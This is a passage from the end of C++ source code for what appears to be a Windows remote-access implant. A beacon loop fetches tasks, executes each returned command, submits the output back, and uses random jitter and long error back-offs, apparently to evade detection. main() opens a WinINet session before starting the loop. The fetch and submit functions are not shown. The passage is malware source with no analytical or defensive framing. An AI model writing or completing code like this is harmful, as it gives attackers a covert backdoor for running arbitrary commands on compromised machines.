        this_thread::sleep_for(chrono::milliseconds(wait_time));
    }

    while (true) {
        try {
            string cmd = get_tasks();
            if (!cmd.empty()) {
                string result = execute_command(cmd);
                submit_output(result);
            }
            apply_jitter();
        }
        catch (exception& e) {
            int wait_time = rand() % 90000 + 30000;
            this_thread::sleep_for(chrono::milliseconds(wait_time));
        }
    }
}

int main() {
    srand(static_cast<unsigned>(time(nullptr)));

    HINTERNET hInternet = InternetOpenA(DEFAULT_USER_AGENT.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return 1;
    }
    InternetCloseHandle(hInternet);

    main_loop();
    return 0;
}
